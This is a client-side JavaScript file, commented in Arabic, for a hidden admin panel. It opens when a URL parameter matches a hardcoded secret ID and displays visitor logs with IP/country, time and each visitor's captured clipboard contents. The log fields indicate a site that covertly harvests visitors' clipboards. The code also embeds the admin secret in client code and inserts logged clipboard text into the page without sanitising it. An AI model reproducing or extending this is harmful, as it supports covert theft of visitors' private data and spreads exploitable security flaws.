// رابط سيرفر Node.js الخارجي
const SERVER_URL = "http://localhost:3000"; 

// التحقق التلقائي من الرقم السري عند فتح الرابط
window.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const adminKey = urlParams.get('admin'); // يفحص إذا كان هناك معلمة admin في الرابط
    
    // الرقم السري الخاص بك الذي طلبت إضافته
    const SECRET_ADMIN_ID = "5840394041"; 

    if (adminKey === SECRET_ADMIN_ID) {
        // إذا كان الرقم مطابقاً، يتم حفظه وتفعيل وضع الأدمن فوراً وتفتح اللوحة تلقائياً
        localStorage.setItem('lazer_admin_key', SECRET_ADMIN_ID);
        openAdminDashboardDirectly();
    }
});

// دالة فتح لوحة التحكم وسجلات الزوار مباشرة للمشرف فقط
async function openAdminDashboardDirectly() {
    let savedKey = localStorage.getItem('lazer_admin_key') || "5840394041";
    
    // إنشاء نافذة عرض السجلات برمجياً إذا لم تكن موجودة
    let logsModal = document.getElementById('logsModal');
    if (logsModal) {
        logsModal.style.display = 'flex';
        let tbody = document.getElementById('logsTableBody');
        tbody.innerHTML = '<tr><td colspan="3">جاري جلب السجلات من سيرفر Node.js...</td></tr>';

        try {
            let response = await fetch(`${SERVER_URL}/api/admin/logs`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ secretKey: savedKey })
            });

            let data = await response.json();
            if (response.status !== 200) {
                alert("خطأ في الصلاحيات!");
                return;
            }

            tbody.innerHTML = '';
            if (data.logs.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3">لا توجد سجلات مسجلة حالياً.</td></tr>';
            } else {
                data.logs.forEach(l => {
                    let tr = document.createElement('tr');
                    tr.innerHTML = `<td>${l.ip_country}</td><td>${l.time}</td><td style="color:#ff0055;">${l.clipboard}</td>`;
                    tbody.appendChild(tr);
                });
            }
        } catch (e) {
            alert("فشل الاتصال بسيرفر Node.js الخارجي!");
        }
    }
}
